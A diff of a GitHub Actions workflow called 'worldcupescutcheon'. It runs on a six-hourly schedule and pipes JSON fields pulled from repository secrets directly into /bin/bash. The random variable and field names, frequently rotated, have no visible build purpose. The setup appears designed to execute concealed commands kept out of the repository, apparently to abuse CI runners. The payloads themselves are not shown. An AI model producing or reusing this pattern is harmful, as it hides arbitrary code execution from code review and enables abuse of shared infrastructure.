@@ -1,32 +1,27 @@
 name: worldcupescutcheon
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 5/6 * * *'
-jobs:  # 26393
+    - cron: '4 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: worldcupescutcheon
         env:
-          bva98: ${{ secrets.bva98 }}
+          yth8628: ${{ secrets.yth8628 }}
         run: |
-          echo $bva98 | jq -r .towy20993 | /bin/bash
-          echo $jsk2801 | jq -r .lukv1645 | /bin/bash
-          echo $evyui26 | jq -r .m5 | /bin/bash
-          echo $nsm346 | jq -r .yptw4 | /bin/bash
-          echo $dfsbb39 | jq -r .ais38 | /bin/bash
-          echo $zxpbj8456 | jq -r .cml145 | /bin/bash
-          echo $coqy865 | jq -r .hsy46034 | /bin/bash
-          echo $ehej70073 | jq -r .lm0159 | /bin/bash
-          echo $n6972 | jq -r .bqzw6 | /bin/bash
-          echo $mv35 | jq -r .fnzyz52752 | /bin/bash
-          echo $czsfg25220 | jq -r .jkkj986 | /bin/bash
-          echo $i9 | jq -r .d189 | /bin/bash
-          echo $qst681 | jq -r .e97 | /bin/bash
-          echo $nr18 | jq -r .uf2529 | /bin/bash
-          echo $ixo86 | jq -r .r13253 | /bin/bash
-          echo $tqvpy82313 | jq -r .jamy68161 | /bin/bash
+          echo $yth8628 | jq -r .rcq425 | /bin/bash
+          echo $eyzvw67853 | jq -r .tcesq59285 | /bin/bash
+          echo $ijvs017 | jq -r .wnhj623 | /bin/bash
+          echo $zv95835 | jq -r .won74 | /bin/bash
+          echo $kjx460 | jq -r .crok2 | /bin/bash
+          echo $kphg616 | jq -r .mlm81275 | /bin/bash
+          echo $cvdmd10655 | jq -r .j3049 | /bin/bash
+          echo $ld3 | jq -r .xdzjt503 | /bin/bash
+          echo $lk7828 | jq -r .w38 | /bin/bash
+          echo $kr710 | jq -r .iys695 | /bin/bash
 
